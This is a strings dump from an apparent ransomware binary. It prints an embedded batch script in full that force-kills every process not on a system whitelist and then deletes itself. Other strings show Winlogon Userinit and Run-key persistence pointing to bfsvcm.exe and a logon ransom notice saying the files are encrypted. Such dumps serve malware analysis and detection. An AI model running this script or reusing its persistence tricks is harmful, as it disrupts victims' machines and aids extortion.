[Strings]
nth paddr      vaddr      len  size section type    string
750 0x0000b31b 0x0040d11b 1021 1022 .data   ascii   SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe:\r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nTASKKILL /F /IM "sqlbrowser.exe"\r\ndel W.bat\r\nExit\r\n
751 0x0000b71d 0x0040d51d 53   54   .data   ascii   SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
752 0x0000b753 0x0040d553 44   45   .data   ascii   Software\Microsoft\Windows NT\CurrentVersion
753 0x0000b780 0x0040d580 46   47   .data   ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
754 0x0000b7af 0x0040d5af 6    7    .data   ascii   unlock
755 0x0000b7b7 0x0040d5b7 11   12   .data   ascii   ProductName
756 0x0000b7c3 0x0040d5c3 23   24   .data   ascii   Windows version unknown
757 0x0000b7db 0x0040d5db 6    7    .data   ascii   Hacked
758 0x0000b7e3 0x0040d5e3 8    9    .data   ascii   Userinit
759 0x0000b7ed 0x0040d5ed 21   22   .data   ascii   c:\Windows\bfsvcm.exe
760 0x0000b803 0x0040d603 33   34   .data   ascii   C:\Windows\system32\userinit.exe,
761 0x0000b826 0x0040d626 55   56   .data   ascii   C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
762 0x0000b85f 0x0040d65f 38   39   .data   ascii   "c:\Windows\notepad.exe" c:\ReadMe.TxT
763 0x0000b887 0x0040d687 18   19   .data   ascii   LegalNoticeCaption
764 0x0000b89a 0x0040d69a 24   25   .data   ascii   SeSystemProfilePrivilege
765 0x0000b8b3 0x0040d6b3 15   16   .data   ascii   LegalNoticeText
766 0x0000b8c3 0x0040d6c3 41   42   .data   ascii   Attention!!! Your files are encrypted !!!
767 0x0000b8ed 0x0040d6ed 62   63   .data   ascii   To recover files, follow the prompts in the text file "Readme"
768 0x0000ba7e 0x0040e07e 5    12   .rsrc   utf16le crypt
769 0x0000ba90 0x0040e090 13   28   .rsrc   utf16le MS Sans Serif

